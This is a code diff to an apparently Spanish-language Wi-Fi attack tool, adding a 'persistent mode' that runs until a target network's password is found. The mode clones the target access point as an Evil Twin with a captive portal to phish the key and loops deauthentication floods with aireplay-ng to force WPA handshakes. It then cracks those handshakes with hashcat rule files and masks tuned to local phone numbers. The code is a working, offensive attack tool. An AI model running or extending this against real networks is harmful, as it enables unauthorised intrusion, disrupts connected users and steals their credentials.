@@ -383,6 +383,243 @@ def _hashcat_tracked(eng, hash_file, wordlist, extra_flags, label, timeout_sec=3
     return pot
 
 # ─────────────────────────────────────────────────────────────────────────────
+# Modo persistente: hashcat en loop + Evil Twin hasta CTRL+C o clave encontrada
+# ─────────────────────────────────────────────────────────────────────────────
+def _modo_persistente(essid, bssid, channel, iface, wordlist):
+    """
+    Corre indefinidamente hasta que el usuario presione CTRL+C o se encuentre la clave.
+    Estrategia:
+      1. Mata procesos pesados innecesarios (KARMA, etc.) para liberar RAM
+      2. Lanza Evil Twin en background (portal cautivo)
+      3. Mantiene captura de handshake + deauth en loop
+      4. Corre hashcat con reglas escaladas en loop sin timeout
+      5. Muestra estadísticas en tiempo real en consola
+    """
+    essid_s = re.sub(r'[^\w\-]', '_', essid)
+    os.makedirs("exploit-engine", exist_ok=True)
+
+    # ── Liberar RAM matando procesos innecesarios ──────────────────────────────
+    subprocess.run("pkill -f 'karma' 2>/dev/null; pkill -f 'airbase-ng' 2>/dev/null; "
+                   "pkill -f hashcat 2>/dev/null; pkill -f hcxdumptool 2>/dev/null",
+                   shell=True, stdin=subprocess.DEVNULL,
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(2)
+
+    print()
+    separador("MODO PERSISTENTE — CTRL+C para detener")
+    print(f"  {GREEN}hashcat en loop + Evil Twin activos hasta encontrar la clave.{END}")
+    print(f"  {DIM}Presioná CTRL+C en cualquier momento para ver el resumen y salir.{END}\n")
+
+    clave  = None
+    metodo = None
+    hash_file = f"exploit-engine/hs_{essid_s}-01.hc22000"  # handshake convertido
+
+    # ── Evil Twin en background ────────────────────────────────────────────────
+    _et_result  = {"clave": None}
+    _et_stop    = threading.Event()
+
+    def _et_worker():
+        try:
+            from herradura import _evil_twin_monitor  # noqa: misma función interna
+        except Exception:
+            pass
+        # Buscar función evil twin en globals
+        _fn = globals().get("_evil_twin_monitor")
+        if _fn and check_tool("hostapd") and check_tool("dnsmasq"):
+            c = _fn(essid, bssid, channel, iface, stop_event=_et_stop, timeout_s=86400)
+            if c:
+                _et_result["clave"] = c
+
+    _et_thread = threading.Thread(target=_et_worker, daemon=True)
+    _et_thread.start()
+    ok(f"Evil Twin lanzado — AP '{CYAN}{essid}{END}' clonado (portal cautivo activo)")
+
+    # ── Captura de handshake en background continua ────────────────────────────
+    hs_base  = f"exploit-engine/hs_{essid_s}"
+    cap_file = None
+
+    # Iniciar airodump persistente
+    _cap_proc = subprocess.Popen(
+        f"airodump-ng -c {channel} --bssid {bssid} -w {hs_base} {iface} 2>/dev/null",
+        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        stdin=subprocess.DEVNULL)
+    time.sleep(8)
+
+    # ── Reglas escaladas para hashcat ─────────────────────────────────────────
+    RULES_ORDER = [
+        "",                                              # sin regla (wordlist directa)
+        "/usr/share/hashcat/rules/best64.rule",
+        "/usr/share/hashcat/rules/rockyou-30000.rule",
+        "/usr/share/hashcat/rules/T0XlC.rule",
+        "/usr/share/hashcat/rules/dive.rule",
+        "/usr/share/hashcat/rules/OneRuleToRuleThemAll.rule",
+    ]
+    rules_avail = [r for r in RULES_ORDER if not r or os.path.exists(r)]
+
+    # ── Máscaras para passwords numéricos/comunes (complementa diccionario) ───
+    MASKS = [
+        "?d?d?d?d?d?d?d?d",       # 8 dígitos
+        "?d?d?d?d?d?d?d?d?d",     # 9 dígitos
+        "?d?d?d?d?d?d?d?d?d?d",   # 10 dígitos
+        "09?d?d?d?d?d?d",          # teléfono Uruguay 09x
+        "2?d?d?d?d?d?d?d",         # teléfono Uruguay 2xxx
+        "?l?l?l?l?l?l?l?l",       # 8 minúsculas
+        "?u?l?l?l?l?l?l?d",       # capitalizada + dígito
+        "?l?l?l?l?d?d?d?d",       # palabra + 4 dígitos
+    ]
+
+    pasada   = 0
+    total_probadas = 0
+    fase_actual    = ""
+
+    def _show_stats(label, tried, total, speed, eta=""):
+        pct = f"{tried/total*100:.1f}%" if total else "?%"
+        eta_s = f" ETA {eta}" if eta else ""
+        sys.stdout.write(
+            f"\r  {CYAN}[PERSISTENTE]{END} {WHITE}{label}{END} · "
+            f"{tried:,}/{total:,} ({pct}) · {speed:,}/s{eta_s}  "
+        )
+        sys.stdout.flush()
+
+    def _run_hashcat_persistent(hf, wl, extra, label):
+        """Corre hashcat sin timeout, parsea progreso en tiempo real."""
+        nonlocal total_probadas, fase_actual
+        fase_actual = label
+        cmd = (f"hashcat -m 22000 -O {hf} {wl} {extra} --force "
+               f"--machine-readable --status --status-timer=3 --quiet 2>/dev/null")
+        proc = subprocess.Popen(cmd, shell=True,
+                                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
+                                stdin=subprocess.DEVNULL, text=True,
+                                errors="replace", bufsize=1)
+        tried = 0; speed = 0; total = 0
+        try:
+            for line in proc.stdout:
+                line = line.strip()
+                if not line:
+                    continue
+                parts = line.split("\t")
+                if parts[0] == "STATUS" and len(parts) > 4:
+                    try:
+                        si = parts.index("SPEED")
+                        speed = int(parts[si + 1])
+                    except (ValueError, IndexError):
+                        pass
+                    try:
+                        pi = parts.index("PROGRESS")
+                        tried = int(parts[pi + 1])
+                        total = int(parts[pi + 2]) or total
+                    except (ValueError, IndexError):
+                        pass
+                    eta = ""
+                    if speed > 0 and total > tried:
+                        s = (total - tried) // speed
+                        eta = f"{s//3600}h{s%3600//60}m{s%60:02d}s" if s > 3600 else f"{s//60}m{s%60:02d}s"
+                    _show_stats(label, tried, total, speed, eta)
+        except Exception:
+            pass
+        try:
+            proc.wait(timeout=10)
+        except Exception:
+            proc.kill()
+        total_probadas += tried
+        return run(f"hashcat --show --quiet -m 22000 {hf} 2>/dev/null", capture=True) or ""
+
+    def _check_handshake_and_convert():
+        """Busca .cap y convierte a hc22000 si hay handshake EAPOL."""
+        caps = [f"exploit-engine/{f}" for f in os.listdir("exploit-engine")
+                if f.startswith(f"hs_{essid_s}") and f.endswith(".cap")]
+        for cap in caps:
+            out_ac = run(f"aircrack-ng {cap} 2>/dev/null", capture=True) or ""
+            m = re.search(r'\((\d+)\s+handshake', out_ac, re.I)
+            if m and int(m.group(1)) > 0:
+                hc = cap.replace(".cap", ".hc22000")
+                if not os.path.exists(hc) or os.path.getsize(hc) == 0:
+                    run(f"hcxpcapngtool -o {hc} {cap} 2>/dev/null", capture=True)
+                if os.path.exists(hc) and os.path.getsize(hc) > 0:
+                    return hc
+        return None
+
+    try:
+        while not clave:
+            # Verificar si Evil Twin ya encontró la clave
+            if _et_result["clave"]:
+                clave  = _et_result["clave"]
+                metodo = "Evil Twin — portal cautivo"
+                break
+
+            # Intentar capturar / actualizar handshake con deauth
+            pasada += 1
+            info(f"\n  Pasada {pasada} — deauth + verificando handshake...")
+            run(f"aireplay-ng -0 15 -a {bssid} {iface} >/dev/null 2>&1")
+            time.sleep(5)
+            run(f"aireplay-ng -0 20 -a {bssid} {iface} >/dev/null 2>&1")
+            time.sleep(5)
+
+            hc = _check_handshake_and_convert()
+            if not hc:
+                info("  Sin handshake EAPOL aún — esperando clientes o Evil Twin...")
+                time.sleep(10)
+                continue
+
+            # Crackear con reglas escaladas
+            for rule in rules_avail:
+                if _et_result["clave"]:
+                    break
+                rf    = f"-r {rule}" if rule else ""
+                rname = os.path.basename(rule) if rule else "sin-regla"
+                label = f"Pasada {pasada} · {rname}"
+                pot   = _run_hashcat_persistent(hc, wordlist, rf, label)
+                pm    = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
+                if pm:
+                    clave  = pm.group(1).strip()
+                    metodo = f"hashcat persistente — {rname}"
+                    break
+
+            if clave:
+                break
+
+            # Máscaras numéricas después de las reglas
+            for mask in MASKS:
+                if clave or _et_result["clave"]:
+                    break
+                label = f"Pasada {pasada} · máscara {mask}"
+                cmd_m = (f"hashcat -m 22000 -O {hc} -a 3 '{mask}' --force "
+                         f"--machine-readable --status --status-timer=3 --quiet 2>/dev/null")
+                pot   = _run_hashcat_persistent.__wrapped__(hc, "", "", label) if hasattr(_run_hashcat_persistent, '__wrapped__') else ""
+                # Simplified mask run
+                proc_m = subprocess.Popen(cmd_m, shell=True, stdout=subprocess.PIPE,
+                                          stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
+                                          text=True, errors="replace", bufsize=1)
+                try:
+                    for line in proc_m.stdout:
+                        pass  # consume output, stats not tracked for masks
+                except Exception:
+                    pass
+                proc_m.wait()
+                pot = run(f"hashcat --show --quiet -m 22000 {hc} 2>/dev/null", capture=True) or ""
+                pm  = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
+                if pm:
+                    clave  = pm.group(1).strip()
+                    metodo = f"hashcat persistente — máscara {mask}"
+                    break
+
+    except KeyboardInterrupt:
+        print(f"\n\n  {YELLOW}[!] Detenido por el usuario. Resumen:{END}")
+
+    # Limpieza
+    _et_stop.set()
+    _cap_proc.terminate()
+    _cap_proc.wait()
+    print(f"\n  {DIM}Total contraseñas probadas esta sesión: {total_probadas:,}{END}")
+
+    if not clave and _et_result["clave"]:
+        clave  = _et_result["clave"]
+        metodo = "Evil Twin — portal cautivo"
+
+    return clave, metodo
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Helpers de sistema
 # ─────────────────────────────────────────────────────────────────────────────
 def run(cmd, capture=False):
@@ -1192,6 +1429,11 @@ def modo_wizard():
             if _twin_result.get("clave"):
                 clave  = _twin_result["clave"]
                 metodo = "Evil Twin — portal cautivo"
+
+        # ── MODO PERSISTENTE si el Engine no encontró la clave ─────────────
+        if not clave:
+            clave, metodo = _modo_persistente(
+                essid, bssid, channel, mon_iface, wordlist)
 
         # ── Kr00k (si el AP usa chip Broadcom/Cypress) ─────────────────────
         if not clave:
